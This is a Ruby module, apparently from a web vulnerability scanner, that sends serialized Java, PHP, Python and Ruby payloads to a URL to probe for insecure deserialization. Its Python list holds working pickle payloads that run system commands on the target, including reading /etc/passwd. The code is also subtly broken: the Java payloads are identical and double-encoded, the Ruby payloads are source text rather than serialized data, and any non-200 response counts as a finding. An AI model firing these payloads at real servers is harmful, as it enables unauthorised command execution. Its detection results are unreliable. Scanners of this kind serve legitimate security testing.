require 'uri'
require 'base64'
require_relative '../utils/network'
require_relative '../utils/colorize'

class Deserialization
  JAVA_PAYLOADS = [
    'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAANdGVzdA==',
    'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAANdGVzdA==',
    'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAANdGVzdA=='
  ]

  PHP_PAYLOADS = [
    'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
    'a:1:{s:4:"test";s:4:"test";}',
    'O:4:"Test":1:{s:4:"test";s:4:"test";}',
    'O:8:"stdClass":2:{s:4:"test";s:4:"test";s:4:"test2";s:4:"test2";}',
    'a:2:{s:4:"test";s:4:"test";s:4:"test2";s:4:"test2";}'
  ]

  PYTHON_PAYLOADS = [
    'cos\nsystem\n(S\'id\'\ntR.',
    'cos\nsystem\n(S\'whoami\'\ntR.',
    'cos\nsystem\n(S\'uname -a\'\ntR.',
    'cos\nsystem\n(S\'cat /etc/passwd\'\ntR.',
    'cos\nsystem\n(S\'ls -la\'\ntR.'
  ]

  RUBY_PAYLOADS = [
    'Marshal.dump([1,2,3])',
    'Marshal.load(Marshal.dump([1,2,3]))',
    'YAML.load("--- !ruby/object:Test\n  test: test\n")'
  ]

  def self.test_java_deserialization(url, payload_type = :basic)
    vulnerable = false
    
    JAVA_PAYLOADS.each do |payload|
      begin
        encoded = Base64.encode64(payload).strip
        response = Network.http_request(url, :post, {
          'Content-Type' => 'application/x-java-serialized-object'
        }, encoded)
        
        next unless response
        
        if response.body.include?("java") || response.body.include?("serialization") || response.code != "200"
          puts Colorize.red("Possible Java deserialization vulnerability!")
          vulnerable = true
        end
      rescue
      end
    end
    
    vulnerable
  end

  def self.test_php_deserialization(url, payload_type = :basic)
    vulnerable = false
    
    PHP_PAYLOADS.each do |payload|
      begin
        response = Network.http_request(url, :post, {
          'Content-Type' => 'application/x-www-form-urlencoded'
        }, "data=#{URI.encode_www_form_component(payload)}")
        
        next unless response
        
        if response.body.include?("unserialize") || response.body.include?("serialize") || response.code != "200"
          puts Colorize.red("Possible PHP deserialization vulnerability!")
          vulnerable = true
        end
      rescue
      end
    end
    
    vulnerable
  end

  def self.test_python_deserialization(url, payload_type = :basic)
    vulnerable = false
    
    PYTHON_PAYLOADS.each do |payload|
      begin
        encoded = Base64.encode64(payload).strip
        response = Network.http_request(url, :post, {
          'Content-Type' => 'application/x-python-serialize'
        }, encoded)
        
        next unless response
        
        if response.body.include?("pickle") || response.body.include?("marshal") || response.code != "200"
          puts Colorize.red("Possible Python deserialization vulnerability!")
          vulnerable = true
        end
      rescue
      end
    end
    
    vulnerable
  end

  def self.test_ruby_deserialization(url, payload_type = :basic)
    vulnerable = false
    
    RUBY_PAYLOADS.each do |payload|
      begin
        encoded = Base64.encode64(payload).strip
        response = Network.http_request(url, :post, {
          'Content-Type' => 'application/x-ruby-marshal'
        }, encoded)
        
        next unless response
        
        if response.body.include?("marshal") || response.body.include?("yaml") || response.code != "200"
          puts Colorize.red("Possible Ruby deserialization vulnerability!")
          vulnerable = true
        end
      rescue
      end
    end
    
    vulnerable
  end

  def self.test_all(url)
    {
      java: test_java_deserialization(url),
      php: test_php_deserialization(url),
      python: test_python_deserialization(url),
      ruby: test_ruby_deserialization(url)
    }
  end
end

